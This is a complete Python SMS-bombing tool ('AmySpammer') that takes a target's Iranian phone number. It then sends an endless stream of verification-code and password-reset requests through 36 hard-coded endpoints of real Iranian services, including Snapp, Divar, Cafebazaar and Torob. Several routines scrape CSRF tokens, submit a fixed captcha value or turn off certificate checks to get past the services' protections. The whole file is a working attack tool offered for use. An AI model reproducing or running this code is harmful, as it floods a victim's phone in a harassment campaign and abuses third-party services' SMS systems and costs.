from urllib3.exceptions import InsecureRequestWarning
import requests, random, time, os


fnum3 = ['910', '911', '912', '913', '914', '915', '916', '917', '918', '919', '990', '991', '992', '993', '994', '932', '930', '933', '935', '936', '937', '938', '939', '901', '902', '903', '904', '905', '941', '920', '921', '922', '931', '934']
fnum4 = ['9990', '9998', '9944']
fnum5 = ['99910', '99911', '99913', '99914', '99996', '99997', '99998', '99999', '99810', '99811', '99812', '99814']


class color():
	RED = '\033[31m'
	GREEN = '\033[32m'
	YELLOW = '\033[33m'
	BLUE = '\033[34m'
	BLUE1 = '\033[94m'
	MAGENTA = '\033[35m'
	PURPLE = '\033[1;35;48m'
	CYAN = '\033[36m'
	WHITE = '\033[37m'
	BLACK = '\033[1;30;48m'
	DEFAULT = '\033[91m\033[00m'


def clean():
	os.system(['clear', 'cls'][os.name == 'nt'])


def banner():
	print(f'''{color.GREEN}                           _____
    /\                    / ____|
   /  \   _ __ ___  _   _| (___  _ __   __ _ _ __ ___  _ __ ___   ___ _ __
  / /\ \ | '_ ` _ \| | | |\___ \| '_ \ / _` | '_ ` _ \| '_ ` _ \ / _ \ '__|
 / ____ \| | | | | | |_| |____) | |_) | (_| | | | | | | | | | | |  __/ |
/_/    \_\_| |_| |_|\__, |_____/| .__/ \__,_|_| |_| |_|_| |_| |_|\___|_|
                     __/ |      | |
                    |___/       |_|      {color.BLUE1}   github.com/weed-web
	''')


def phone():
	try:
		a = int(input(f'{color.YELLOW}Enter Target Phone Number (e.g. 09123456789):{color.BLACK} '))
		return a
	except ValueError:
		return None


def getnum():
	n = phone()
	while(n == None or len(str(n)) != 10):
		print(f'{color.RED}Enter A Correct Phone Number!')
		n = phone()
	n = str(n)
	if(n[:3] in fnum3 or n[:4] in fnum4 or n[:5] in fnum5):
		return 1, n
	else:
		return 0, n


def ASM1(number):
	number = '0' + number
	data = {'mobile':number}
	s = requests.post('https://www.delino.com/user/register', data = data)
	if(s.text == '{"password":false}' and s.status_code == 200):
		return 1


def ASM2(number):
	number = '0' + number
	s = requests.post(f'https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone={number}').json()
	if(s['status'] == True):
		return 1


def ASM3(number):
	number = '0' + number
	djson = {'credential':{'phoneNumber':number, 'role':'PASSENGER'}}
	s = requests.post('https://tap33.me/api/v2/user', json = djson).json()
	if(s['result'] == 'OK'):
		return 1


def ASM4(number):
	s = requests.get(f'https://core.gap.im/v1/user/add.json?mobile=+98{number}').json()
	if(s['status'] == 'success'):
		return 1


def ASM5(number):
	number = '0' + number
	data = {'phone':number}
	s = requests.post('https://api.snapp.ir/api/v1/sms/link', data = data).json()
	if(s['message'] == 'OK'):
		return 1


def ASM6(number):
	djson = {'auth':{'phoneNumber':number}}
	s = requests.post('https://ketabchi.org/api/v1/auth/requestVerificationCode', json = djson).json()
	if(s['success'] == True):
		return 1


def ASM7(number):
	number = '0' + number
	data = {'cellphone':number, 'captcha':'111'}
	s = requests.post('https://snappfood.ir/auth/login_with_no_pass', data = data).json()
	if(s['isRegistered'] == False and s['hasPassword'] == False and s['result'] == True):
		return 1
	elif(s['isRegistered'] == True and s['hasPassword'] == True):
		data = {'username_or_email':number, 'type':'sms', 'captcha':'111'}
		q = requests.post('https://snappfood.ir/customer/password/forgot', data = data).json()
		if(q['status'] == True):
			return 1


def ASM8(number):
	number = '0' + number
	data = '{"phone":"' + number + '"}: ""'
	s = requests.post('https://api.divar.ir/v5/auth/authenticate', data = data).json()
	if(s['authenticate_response'] == 'AUTHENTICATION_VERIFICATION_CODE_SENT'):
		return 1


def ASM9(number):
	number = '0' + number
	headers = {'Accept-Encoding':'gzip, deflate, sdch', 'Accept-Language':'en-US,en;q=0.8', 'Upgrade-Insecure-Requests':'1', 'User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36', 'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'Cache-Control':'max-age=0', 'Connection':'keep-alive'}
	s = requests.get('https://www.sheypoor.com/session', headers = headers).text
	csrf = (s.split("tokenValue: '"))[1].split("',")[0]
	data = {'username':number, 'csrf-key':csrf}
	r = requests.post('https://www.sheypoor.com/auth', headers = headers, data = data).json()
	if(r['success'] == True):
		return 1


def ASM10(number):
	data = {'Number':number}
	s = requests.post('https://fidilio.com/api/MemberUser/Mobile', data = data)
	if('<h1>این شماره قبلا استفاده شده است لطفا از فراموشی رمز عبور استفاده کنید</h1>' not in s.text and s.status_code == 200):
		return 1


def ASM11(number):
	number = '0' + number
	data = {'send':'1', 'cellphone':number}
	s = requests.post('https://web.emtiyaz.app/json/login', data = data).text
	if('لطفآ کد تایید را وارد کنید' in s or 'تکرار تایید' in s):
		return 1


def ASM12(number):
	number = '0' + number
	djson = {'mobile':number}
	s = requests.post('https://api.dunro.com/api/v1.4/appLinkSender', json = djson).text
	if(s == '"done"'):
		return 1


def ASM13(number):
	number = '0' + number
	data = {'action':'getAppViaSMS', 'number':number}
	headers = {'Accept':'*/*', 'Accept-Encoding':'gzip, deflate, br', 'Accept-Language':'en-US,en;q=0.5', 'Connection':'keep-alive', 'Content-Length':'38', 'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8', 'Cookie':'pushNotification-shownCount-5460=0; _hjFirstSeen=1; _hjAbsoluteSessionInProgress=0', 'Host':'hamrahcard.ir', 'Origin':'https://hamrahcard.ir', 'Referer':'https://hamrahcard.ir/', 'TE':'Trailers', 'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0', 'X-Requested-With':'XMLHttpRequest'}
	s = requests.post('https://hamrahcard.ir/wp-admin/admin-ajax.php', headers = headers, data = data).json()
	if(s['success'] == True):
		return 1


def ASM14(number):
	number = '0' + number
	djson = {'app_version':'1.2.0', 'isVirtual':False, 'manufacturer':'Linux', 'model':'Firefox 79.0', 'phone':number, 'platform':'pwa','serial':True, 'type':'CUSTOMER', 'uuid':True, 'version':'x86_64'}
	s = requests.post('https://api.alopeyk.com/api/v2/login', json = djson).json()
	if(s['status'] == 'success'):
		return 1
	elif(s['status'] == 'fail'):
		djson = {'app_version':'1.2.0', 'email':'a@b.co', 'firstname':'a', "isVirtual":False, 'lastname':'b', 'lat':'null','lng':'null', 'manufacturer':'Linux', 'model':'Firefox 79.0', 'phone':number,'platform':'pwa', 'referred_by':'', 'serial':True, 'type':'CUSTOMER', 'uuid':True, 'version':'x86_64'}
		s = requests.post('https://api.alopeyk.com/api/v2/register-customer', json = djson).json()
		if(s['status'] == 'success'):
			return 1


def ASM15(number):
	number = '0' + number
	data = {'username':'', 'phone':number}
	s = requests.post('https://alopeyk.com/api/sms/send.php', data = data).json()
	if(s['status'] == 'success'):
		return 1


def ASM16(number):
	number = '0' + number
	requests.packages.urllib3.disable_warnings(category = InsecureRequestWarning)
	s = requests.get(f'https://app.ezpay.ir:8443/open/v1/user/validation-code/{number}', verify = False).json()
	if(s['expireDate'] != 0):
		return 1


def ASM17(number):
	number = '0' + number
	s = requests.get(f'https://parscoders.com/cellphone/reset-password/{number}')
	if(s.status_code == 200):
		return 1


def ASM18(number):
	djson = {'properties':{'clientID':'152mm2s4cxontvyym3ut2xgat8bzydqc', 'clientVersion':'web', 'deviceID':'152mm2s4cxontvyym3ut2xgat8bzydqc', 'language':2}, 'singleRequest':{'getOtpTokenRequest':{'username':'98' + number}}}
	s = requests.post('https://api.cafebazaar.ir/rest-v1/process/GetOtpTokenRequest', json = djson).json()
	if(s['properties']['statusCode'] == 200):
		return 1


def ASM19(number):
	number = '0' + number
	s = requests.post(f'https://www.driq.com/api/v1/account/ConfirmPhoneNumber?phonenumber={number}').json()
	if(s['succeeded'] == True):
		return 1


def ASM20(number):
	number = '0' + number
	djson = {'PhoneNumber':number}
	s = requests.post('http://accounts.gaj.ir/api/Account/SendPhoneNumberConfirmationCode', json = djson)
	if(s.status_code == 200):
		return 1


def ASM21(number):
	number = '0' + number
	data = {'mobile':number}
	s = requests.post('https://www.delino.com/app/sms', data = data)
	if(s.status_code == 200):
		return 1


def ASM22(number):
	number = '0' + number
	djson = {'mobile':number}
	s = requests.post('https://app.itoll.ir/api/v1/auth/login', json = djson).json()
	if(s['success'] == True):
		return 1


def ASM23(number):
	number = '+98' + number
	djson = {'cellphone':number}
	s = requests.post('https://app.snapp.taxi/api/api-passenger-oauth/v2/otp', json = djson).json()
	if(s['status'] == 'OK'):
		return 1


def ASM24(number):
	number = '98' + number
	djson = {'msisdn':number}
	s = requests.post('https://app.lenz.ir:64014/api/v2/auth/forget/generate/otp', json = djson).json()
	if('success' in s and s['success'] == True):
		return 1
	elif(s['message'] == 'این شماره قبلا ثبت نام نکرده است'):
		r = requests.post('https://app.lenz.ir:64014/api/v2/auth/register/otp/generate', json = djson).json()
		if(r['success'] == True):
			return 1
	elif(s['message'] == 'تعداد دفعات ارسال رمز یکبار مصرف بیش از حد مجاز است'):
		return None


def ASM25(number):
	number = '0' + number
	djson = {'mobile':number}
	s = requests.post('https://api.dunro.com/api/v3/auth/smsauth/requestcode', json = djson).json()
	if(s['meta']['code'] == 200):
		return 1


def ASM26(number):
	number = '0' + number
	requests.packages.urllib3.disable_warnings(category = InsecureRequestWarning)
	djson = {'method':'phone_number', 'phone_number':number, 'my_server_api_version':1, 'my_app_type':'web', 'platform':'web', 'my_app_version':7, 'time_zone_offset':270}
	s = requests.post('https://homa.ghabouli.info/teacher/send_single_use_login_code', verify = False, json = djson).json()
	if(s['success'] == True):
		return 1


def ASM27(number):
	number = '98' + number
	s = requests.get('https://shgetdcmess.iranlms.ir/').json()
	url = 'https://shadmessenger' + s['data']['default_api'] + '.iranlms.ir/'
	jdata = {'api_version': '3', 'data': {'phone_number': number, 'send_type': 'SMS'}, 'method': 'sendCode'}
	r = requests.post(url, json = jdata).json()
	if(r['status'] == 'OK'):
		return 1


def ASM28(number):
	number = '0' + number
	djson = {'phone':number}
	s = requests.post('https://mobapi.banimode.com/api/v1/auth/request', json = djson).json()
	if(s['status'] == 'success' and s['status_code'] == 200):
		return 1


def ASM29(number):
	number = '0' + number
	s = requests.get('https://app.100startups.ir/login/').text
	csrf = (s.split('<input type="hidden" name="csrfmiddlewaretoken" value="'))[1].split('">')[0]
	data = {'csrfmiddlewaretoken':csrf, 'mobile':number, 'submit_mobile':''}
	headers = {'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'Accept-Encoding':'gzip, deflate, br', 'Accept-Language':'en-US,en;q=0.9', 'Cache-Control':'max-age=0', 'Connection': 'keep-alive', 'Content-Length': '118', 'Content-Type': 'application/x-www-form-urlencoded', 'Cookie':'csrftoken=' + csrf + ';', 'Host':'app.100startups.ir', 'Origin':'https://app.100startups.ir', 'Referer':'https://app.100startups.ir/login/', 'Sec-Fetch-Dest':'document', 'Sec-Fetch-Mode':'navigate', 'Sec-Fetch-Site':'same-origin', 'Sec-Fetch-User':'?1', 'Upgrade-Insecure-Requests':'1', 'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36'}
	r = requests.post('https://app.100startups.ir/login/', headers = headers, data = data)
	r.encoding = r.apparent_encoding
	if('</i>چنین حسابی وجود ندارد</h2>' not in r.text and '</i>پس از دو دقیقه دوباره تلاش کنید</h2>' not in r.text and 'کد ارسال شده' in r.text):
		return 1
	else:
		l = requests.get('https://app.100startups.ir/verify/').text
		csrf = (l.split('<input type="hidden" name="csrfmiddlewaretoken" value="'))[1].split('">')[0]
		data = {'csrfmiddlewaretoken':csrf, 'phone':number}
		headers = {'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8','Accept-Encoding':'gzip, deflate, br','Accept-Language':'en-US,en;q=0.5','Connection':'keep-alive','Content-Length':'102','Content-Type':'application/x-www-form-urlencoded','Cookie':'csrftoken=' + csrf + ';','Host':'app.100startups.ir','Origin':'https://app.100startups.ir','Referer':'https://app.100startups.ir/register/','Upgrade-Insecure-Requests':'1','User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0'}
		m = requests.post('https://app.100startups.ir/register/', headers = headers, data = data)
		m.encoding = m.apparent_encoding
		if('اعتبارسنجی' in m.text):
			return 1


def ASM30(number):
	number = '0' + number
	djson = {'cellphone':number}
	s = requests.post('https://mamifood.org/Registration.aspx/IsUserAvailable', json = djson).json()
	if(s['d'] == False):
		djson = {'Phone':number}
		r = requests.post('https://mamifood.org/Registration.aspx/SendValidationCode', json = djson).json()
		if(r['d'] != ''):
			return 1
	else:
		djson = {'phone':number}
		l = requests.post('https://mamifood.org/Registration.aspx/Remember', json = djson).json()
		if(l['d'] == True):
			return 1


def ASM31(number):
	number = '0' + number
	data = {'Phone':number, 'Version':'C'}
	s = requests.post('https://sirsheed.ir/api/sms', data = data).json()
	if(s['StatusCode'] == 200 and s['ResponseMessage'] == 1):
		return 1
	else:
		data = {'MeliOrPhone':number, 'Version': 'c'}
		r = requests.post('https://sirsheed.ir/api/customersregister/Forgotpass', data = data).json()
		if(r['StatusCode'] == 200):
			return 1


def ASM32(number):
	number = '0' + number
	djson = {'firstName': 'ممد', 'lastName': 'ممدی',
	'phoneNumber': number, 'primaryAddress': {'address': '', 'location': {'lat': 35.6995320, 'lng': 51.337797}}, 'setLocation': True}
	s = requests.post('https://www.mamanpaz.ir/api/register?new=', json = djson).json()
	if(s['message'] == 'داده ای با این مشخصات وجود دارد'):
		djson = {'phoneNumber':number}
		r = requests.post('https://www.mamanpaz.ir/api/forgot', json = djson).json()
		if(r['message'] == 'رمز عبور موقت برای شما پیامک شد.'):
			return 1
	else:
		return 1


def ASM33(number):
	number = '0' + number
	djson = {'aff':'', 'forceOtp':False, 'phone':number}
	s = requests.post('https://api.taaghche.com/mybook/site/otp/phone', json = djson).json()
	try:
		res = s['systemNotifications'][0]['additionalData']
		if(s['systemNotifications'][0]['additionalData'] == 'کد تایید به شماره موبایل شما پیامک شد'):
			return 1
	except KeyError:
		return None


def ASM34(number):
	number = '0' + number
	s = requests.get('https://api.torob.com/a/phone/send-pin/?phone_number=' + number).json()
	if(s['message'] == 'pin code sent'):
		return 1


def ASM35(number):
	number = '0' + number
	data = {'cellNumber':number}
	s = requests.post('https://bama.ir/signin-checkforcellnumber', data = data).json()
	if(s['ResponseCode'] == 200 and s['Message'] == 'کد تایید برای ثبت نام ارسال شد'):
		return 1
	elif(s['Result'] == 'OldUser'):
		data = {'cellNumber':number}
		r = requests.post('https://bama.ir/signin-send-otp', data = data).json()
		if(r['ResponseCode'] == 200 and r['Message'] == 'کد تایید برای ثبت نام ارسال شد'):
			return 1


def ASM36(number):
	number = '98' + number
	djson = {'api_version':'3', 'method':'sendCode', 'data':{'phone_number':number, 'send_type':'SMS'}}
	s = requests.post('https://messengerg2c4.iranlms.ir/', json = djson).json()
	if(s['status'] == 'OK'):
		return 1


def spam(phonenum):
	done = 0
	while(True):
		try:
			k = eval('ASM' + str(random.randint(1, 36)) + '(phonenum)')
			time.sleep(1)
		except requests.exceptions.ConnectionError:
			continue
		if(k == 1):
			done += 1
			clean()
			banner()
			print(f'''{color.PURPLE}Successfully Send's: {color.BLACK}{done}''')
			time.sleep(1)


def main():
	try:
		clean()
		banner()
		cc, o = getnum()
		while(cc == 0):
			print(f'{color.RED}Enter A Correct Phone Number!')
			cc, o = getnum()
		clean()
		banner()
		spam(str(o))
	except KeyboardInterrupt:
		print(f'{color.RED}\nExiting...{color.DEFAULT}')
		time.sleep(1)


main()
